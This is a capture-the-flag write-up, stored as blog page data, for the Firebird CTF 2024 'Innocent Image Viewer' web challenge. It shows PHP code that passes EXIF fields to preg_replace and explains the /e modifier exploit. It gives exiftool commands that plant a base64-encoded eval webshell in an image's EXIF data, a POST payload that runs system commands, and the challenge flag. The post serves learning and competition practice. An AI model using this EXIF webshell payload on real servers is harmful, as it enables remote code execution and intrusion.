{"componentChunkName":"component---src-pages-blog-strapi-article-slug-tsx","path":"/blog/firebirdctf-2024-innocent-image-viewer/","result":{"data":{"allStrapiArticle":{"nodes":[{"id":"0d013d41-108a-59ac-882a-cee9ef98af5c","slug":"firebirdctf-2024-innocent-image-viewer","title":"Firebird CTF 2024 - Innocent Image Viewer (775pts)","description":"The devil is in the details.\nhttp://ash-chal.firebird.sh:36025/","content":{"data":{"content":"# Writeup\n\n## Thought\nCheck the network traffic to see if server has information leakage. Found that server is using PHP 5.5.38... really sus üßê   \n![php-5538-sus.png](https://www.cms.void-dojo.ninja/uploads/php_5538_sus_9f1d5bf443.png)\n\nLet's checkout the source code. The website is written in PHP. After upload jpeg image success, print the EXIF information to HTML. \nFocus on this part, possibility have remote code execution exploit:\n```php\n<?php\n...\necho \"The file \". basename($_FILES[\"image\"][\"name\"]). \" has been uploaded.\";\n$exif = exif_read_data($targetFile);\npreg_replace($exif['Make'],$exif['Model'],'');\nif ($exif !== false) {\n    echo \"<h2>EXIF Data:</h2>\";\n    echo \"FileDateTime: \" . (!empty($exif['FileDateTime']) ? $exif['FileDateTime'] : \"N/A\") . \"<br>\";\n    echo \"FileSize: \" . (!empty($exif['FileSize']) ? $exif['FileSize'] : \"N/A\") . \"<br>\";\n    echo \"Camera Model: \" . (!empty($exif['Model']) ? $exif['Model'] : \"N/A\") . \"<br>\";\n    echo \"Height: \" . (!empty($exif['Height']) ? $exif['Height'] : \"N/A\") . \"<br>\";\n    echo \"Width: \" . (!empty($exif['Width']) ? $exif['Width'] : \"N/A\") . \"<br>\";\n    echo \"Comment: \" . (!empty($exif['Comment']) ? $exif['Comment'] : \"N/A\") . \"<br>\";\n    echo \"Bits Per Sample: \" . (!empty($exif['BitsPerSample']) ? $exif['BitsPerSample'] : \"N/A\") . \"<br>\";\n    echo \"Exif Byte Order: \" . (!empty($exif['ExifByteOrder']) ? $exif['ExifByteOrder'] : \"N/A\") . \"<br>\";\n} else {\n    echo \"No EXIF data found.\";\n}\n\n// Display the uploaded image\necho \"<h2>Uploaded Image:</h2>\";\necho \"<img src='$targetFile' alt='Uploaded Image'>\";\n// Display the link to the uploaded photo\necho \"<a href='$targetFile' target='_blank'>Click here to access the uploaded photo</a>\";\n...\n?>\n```\n\n## preg_replace exploit\nThis statement:\n```php\npreg_replace($exif['Make'],$exif['Model'],'');\n```\nYou may google this code statement to check related exploit.   \nWhen using PHP-5.5.x, the first parameter of `preg_replace()` function if exist `\\e`, it will execute second parameter's `eval()` function if there exists. Hence it is a reverse shell and we can use this to inject Unix command payload the find the flag within the server.   \nReference: [malware inside jpg exif](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)    \n\n## Analysis\nOne of the difficult point of this challenge is... we need specific PHP version to replicate the challenge locally, so that we can further develop the RCE payload more efficiently. `preg_replace()` with `/e` seem only work on PHP-5.5.x, the later version has fixed and deprecated this funciton.     \n\nHere I use docker with this image:\n```bash\ndocker pull eugenesia/drupal-php:5.5.38-apache\n```\n![imv-docker-php-image.png](https://www.cms.void-dojo.ninja/uploads/imv_docker_php_image_623dfeae51.png)\n\nLaunch the container.   \nNoted that we need to install PHP extension (.so) to use `EXIF` related function üòì   \nIn docker, we can use `docker-php-ext-install` to manager php extension   \n```bash\ndocker-php-ext-install exif\n```\n\nThen modify the php config file to enable EXIF extension:\n```bash\nvim /usr/local/etc/php/php.ini\n\n...\n[errors]\n; Disable to not print errors to screen. They will still be captured in the log.\ndisplay_errors = 1\n\n; PHP7 outputs lots of deprecated errors as Drupal 7 is built for PHP5.\n; Ignore them as they don't affect function.\nerror_reporting = E_ALL ^ E_DEPRECATED\n\n[extensions]\nextension=exif  ;<---- append this statement\n```\n\nCopy the `index.php` to `www/html/index.php`, use browser visit `http://loaclhost:8080`, you should see the same page as the challenge. If not, just restart the container.      \n\n## RCE payload\nFirst we need to prepare a `.jpeg` image (tested `.png` will not work).   \nRemember our findings on previous section? For the `preg_replace()` function the 1st param consist `/e` will execute 2nd param's `eval()` function.  Our 2nd param within `eval()` function can set it to base64 encoded PHP statement. One possible option is:\n```php\nif (isset($_POST[\"zz1\"])) {eval(stripslashes($_POST[\"zz1\"]));}\n```\nThe statement above means if we POST `zz1` where `zz1` can be any Unix command string, server will execute it using `eval()` function. Hence the jpeg become a reverse shell! To use this statement we encode it with base64 otherwise some of the payload content will be trimmed by the browser (the serialization problems I guess).\nInsert the follow EXIF RCE payload:\n- EXIF['Make'] = '/.*/e'\n- EXIF['Model'] = '@ eval ( base64_decode(\"aWYgKGl zc2V0KCRfUE9TVFsienoxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=\"));'\n- So server will run `preg_replace('/.*/e', '@ eval ( base64_decode(\"aWYgKGl zc2V0KCRfUE9TVFsienoxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=\"));');`\n\n```bash\nexiftool -Make='/.*/e' ./lol.jpg\nexiftool -Model='@ eval ( base64_decode('\"'\"'aWYgKGl zc2V0KCRfUE9TVFsienoxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30='\"'\"'));' ./lol.jpg\n```\nOpen Brutesuite to intercept the traffic, because we need to inject our POST parameter `zz1` for our payload.\nUpload the jpeg to the web, add the following `zz1` payload:\n```bash\nContent-Disposition: form-data; name=\"zz1\"\n\nsystem(\"cd / && ls -la && cat flag\");\n```\n![Screenshot 2024-01-20 215751.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_01_20_215751_11c5948d4c.png)\n\n\n## Done!\n![ash-chal.firebird.sh_36025_index.php (1).png](https://www.cms.void-dojo.ninja/uploads/ash_chal_firebird_sh_36025_index_php_1_edc1a00d12.png)\n\n\nflag: `firebird{wh47_4_b34u71ful_p1c!}`"}},"updatedAt":"2024-02-14T18:55:08.227Z","publishedAt":"2024-02-14T13:56:27.777Z","tags":[{"name":"web","color":"dark"},{"name":"firebirdctf","color":"red"}],"categories":[],"cover":{"formats":{"thumbnail":{"url":"/uploads/thumbnail_firebirdctf_2024_4c8f24745f.png"},"small":null}}}]}},"pageContext":{"id":"0d013d41-108a-59ac-882a-cee9ef98af5c","slug":"firebirdctf-2024-innocent-image-viewer","__params":{"slug":"firebirdctf-2024-innocent-image-viewer"}}},"staticQueryHashes":["3001278788"],"slicesMap":{}}